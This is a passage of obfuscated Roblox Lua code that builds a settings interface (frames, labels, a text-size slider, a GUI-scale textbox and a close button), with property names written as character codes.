_llza[_sc(98,56)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(98,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(98,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(98,56)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(98,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(98,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(98,57)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(98,56)]);
_llza[_sc(98,57)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(98,57)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(98,97)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(98,52)]);
_llza[_sc(98,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(98,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(98,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(98,97)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(98,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(98,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(98,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(98,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(98,97)][_sc(84,101,120,116)]=[[Destroy/Close GUI]];
_llza[_sc(98,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(98,97)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(98,97)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(98,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(98,97)]);
_llza[_sc(98,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(98,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,51)]);
_llza[_sc(98,99)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(98,99)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(98,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(98,99)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(98,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(98,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(98,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(98,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(97,52)]);
_llza[_sc(98,100)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 255);
_llza[_sc(98,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(98,100)][_sc(78,97,109,101)]=[[leftside]];
_llza[_sc(98,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(98,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(98,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(-0.00038, 0, 0, 0);
_llza[_sc(98,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(98,101)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(98,100)]);
_llza[_sc(98,101)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(98,101)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(98,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,100)]);
_llza[_sc(98,102)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 160);
_llza[_sc(98,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(98,102)][_sc(78,97,109,101)]=[[uisettingsTab]];
_llza[_sc(98,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(98,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(99,48)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(98,102)]);
_llza[_sc(99,48)][_sc(78,97,109,101)]=_sc(117,105,115,101,116,116,105,110,103,115,83,99,114,105,112,116);
_llza[_sc(99,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,102)]);
_llza[_sc(99,49)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(99,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(99,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(99,49)][_sc(78,97,109,101)]=[[ACCENT]];
_llza[_sc(99,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(99,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(99,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(99,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(99,49)]);
_llza[_sc(99,50)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(99,50)][_sc(83,105,122,101)]=UDim2.new(0, 174, 0, 2);
_llza[_sc(99,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(99,50)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(99,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(99,50)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(99,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(99,51)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(99,50)]);
_llza[_sc(99,52)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(98,102)]);
_llza[_sc(99,52)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(99,52)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(99,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,102)]);
_llza[_sc(99,53)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(99,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(99,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(99,53)][_sc(78,97,109,101)]=[[TITLE]];
_llza[_sc(99,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(99,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(99,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(99,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(99,54)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(99,53)]);
_llza[_sc(99,54)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(99,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(99,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(99,54)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(99,54)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(99,54)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(99,54)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(99,54)][_sc(83,105,122,101)]=UDim2.new(0, 172, 0, 15);
_llza[_sc(99,54)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(99,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(99,54)][_sc(84,101,120,116)]=[[UI Settings]];
_llza[_sc(99,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(99,54)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(99,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(99,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(99,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(99,54)]);
_llza[_sc(99,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(99,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(99,54)]);
_llza[_sc(99,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(99,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(98,102)]);
_llza[_sc(99,57)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(99,57)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(99,57)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(99,57)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(99,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,102)]);
_llza[_sc(99,97)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(99,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(99,97)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=11;
_llza[_sc(99,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(99,97)][_sc(78,97,109,101)]=[[textsize]];
_llza[_sc(99,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(99,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(99,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.11875, 0);
_llza[_sc(99,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(99,98)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(99,97)]);
_llza[_sc(99,98)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(99,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(99,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(99,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(99,98)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(99,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(99,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(99,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(99,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(99,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(99,98)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(99,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(99,98)]);
_llza[_sc(99,99)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(99,99)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(99,99)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(99,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(99,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(99,98)]);
_llza[_sc(99,100)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(99,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(99,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(99,100)][_sc(78,97,109,101)]=[[sliderFrame]];
_llza[_sc(99,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(99,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(99,100)]);
_llza[_sc(99,101)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(99,101)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(99,102)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(99,100)]);
_llza[_sc(99,102)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(99,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(99,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(99,102)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(99,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(99,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(100,48)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(99,102)]);
_llza[_sc(100,48)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(100,48)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(100,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(99,100)]);
_llza[_sc(100,49)][_sc(90,73,110,100,101,120)]=5;
_llza[_sc(100,49)][_sc(83,105,122,101)]=UDim2.new(0.5, 0, 1, 0);
_llza[_sc(100,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(100,49)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(100,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(100,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(100,50)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(99,98)]);
_llza[_sc(100,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(100,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(100,50)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(100,50)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(100,50)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(100,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(100,50)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(100,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(100,50)][_sc(84,101,120,116)]=[[X/X]];
_llza[_sc(100,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(100,50)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(100,50)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(100,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(100,50)]);
_llza[_sc(100,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(100,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,102)]);
_llza[_sc(100,52)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(100,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(100,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=10;
_llza[_sc(100,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(100,52)][_sc(78,97,109,101)]=[[textsizeLABEL]];
_llza[_sc(100,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(100,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(100,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.11875, 0);
_llza[_sc(100,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(100,53)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(100,52)]);
_llza[_sc(100,53)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(100,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(100,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(100,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(100,53)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(100,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(100,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(100,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(100,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(100,53)][_sc(84,101,120,116)]=[[Text Size:]];
_llza[_sc(100,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(100,53)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(100,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(100,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(100,53)]);
_llza[_sc(100,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(100,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(100,53)]);
_llza[_sc(100,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(100,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,102)]);
_llza[_sc(100,56)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(100,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(100,56)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(100,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(100,56)][_sc(78,97,109,101)]=[[guisize]];
_llza[_sc(100,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(100,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(100,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(100,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(100,57)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(100,56)]);
_llza[_sc(100,57)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(100,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(100,56)]);
_llza[_sc(100,97)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(100,97)][_sc(83,105,122,101)]=UDim2.new(0, 79, 0, 20);
_llza[_sc(100,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(100,97)][_sc(78,97,109,101)]=[[guisize]];
_llza[_sc(100,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(100,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(100,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.54598, 0, 0, 0);
_llza[_sc(100,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(100,98)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(100,97)]);
_llza[_sc(100,98)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(100,98)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(100,98)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(100,98)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(100,99)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(100,97)]);
_llza[_sc(100,99)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(100,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(100,99)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(100,99)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(100,99)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(100,99)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(100,99)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[1.00]];
_llza[_sc(100,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(100,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(100,99)][_sc(84,101,120,116)]=[[]];
_llza[_sc(100,99)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(100,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(100,99)]);
_llza[_sc(100,100)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(100,100)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(100,100)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(100,101)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(100,99)]);
_llza[_sc(100,101)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(100,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(100,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(100,101)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(100,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(100,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(100,102)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(100,101)]);
_llza[_sc(100,102)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(100,102)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(101,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(100,99)]);
_llza[_sc(101,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(101,49)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(100,56)]);
_llza[_sc(101,49)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(101,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(101,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(101,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(101,49)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(101,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(101,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(101,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(101,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(101,49)][_sc(84,101,120,116)]=[[GUI Scale:]];
_llza[_sc(101,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(101,49)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(101,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(101,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(101,49)]);
_llza[_sc(101,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 4);
_llza[_sc(101,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(101,49)]);
_llza[_sc(101,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(101,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,102)]);
_llza[_sc(101,52)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(101,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(101,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=100;
_llza[_sc(101,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(101,52)][_sc(78,97,109,101)]=[[resetdefault]];
_llza[_sc(101,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(101,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
